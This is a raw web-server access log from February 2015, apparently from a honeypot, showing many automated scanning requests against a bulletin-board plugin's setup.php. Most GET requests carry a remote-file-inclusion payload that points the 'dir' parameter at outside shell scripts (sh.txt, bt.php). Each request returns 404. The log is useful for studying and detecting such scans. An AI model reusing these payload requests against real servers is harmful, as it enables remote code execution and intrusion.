181.65.186.35 - - [10/Feb/2015:11:52:21 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:52:22 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
74.208.180.111 - - [10/Feb/2015:11:53:28 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:53:29 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:53:30 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:53:31 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
1.224.163.80 - - [10/Feb/2015:11:56:50 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:56:51 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:56:51 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:56:53 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:56:54 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:56:56 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:56:56 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:56:58 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
178.33.226.103 - - [10/Feb/2015:11:57:17 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:57:17 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:57:18 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:57:19 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:57:19 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:57:19 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:57:20 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:57:20 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
49.50.76.8 - - [10/Feb/2015:11:58:01 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:58:02 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:58:02 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:58:03 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:58:03 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:58:04 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:58:04 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [10/Feb/2015:11:58:05 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [10/Feb/2015:11:58:18 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:58:19 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:58:20 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:58:21 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:58:55 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:58:57 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:58:57 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:58:59 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:11:59:01 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
203.58.0.155 - - [10/Feb/2015:11:59:01 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:59:03 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:59:03 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:11:59:04 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
203.58.0.155 - - [10/Feb/2015:11:59:05 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:11:59:05 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:59:07 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:59:07 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:59:09 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:59:09 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:59:11 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
178.33.226.103 - - [10/Feb/2015:11:59:17 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [10/Feb/2015:11:59:19 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [10/Feb/2015:11:59:19 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [10/Feb/2015:11:59:20 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
181.65.186.35 - - [10/Feb/2015:11:59:32 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:59:34 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:59:38 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:59:40 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:12:00:19 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:00:21 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:00:21 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:00:23 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:12:00:26 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:12:00:28 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:12:00:28 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:12:00:30 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
74.208.180.111 - - [10/Feb/2015:12:00:33 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:00:35 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:00:35 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:12:00:36 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
1.224.163.80 - - [10/Feb/2015:12:00:47 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:00:48 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:00:50 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:12:00:51 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:12:00:52 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:12:00:53 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
181.65.186.35 - - [10/Feb/2015:12:00:53 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:12:00:55 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:12:01:03 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
181.65.186.35 - - [10/Feb/2015:12:01:05 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:12:01:06 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
181.65.186.35 - - [10/Feb/2015:12:01:06 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:12:01:06 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:12:01:07 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
181.65.186.35 - - [10/Feb/2015:12:01:07 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:12:01:10 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
1.224.163.80 - - [10/Feb/2015:12:01:22 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:12:01:25 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:12:01:26 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:12:01:29 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:12:01:54 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:01:56 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:01:56 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:01:58 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:12:02:04 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
1.224.163.80 - - [10/Feb/2015:12:02:05 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
1.224.163.80 - - [10/Feb/2015:12:02:06 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
1.224.163.80 - - [10/Feb/2015:12:02:07 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
1.224.163.80 - - [10/Feb/2015:12:02:15 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir= HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:12:02:16 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:12:02:17 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:12:02:18 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
212.227.18.39 - - [10/Feb/2015:12:05:32 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
212.227.18.39 - - [10/Feb/2015:12:05:33 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
212.227.18.39 - - [10/Feb/2015:12:05:34 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
212.227.18.39 - - [10/Feb/2015:12:05:35 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
1.224.163.80 - - [10/Feb/2015:12:05:53 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
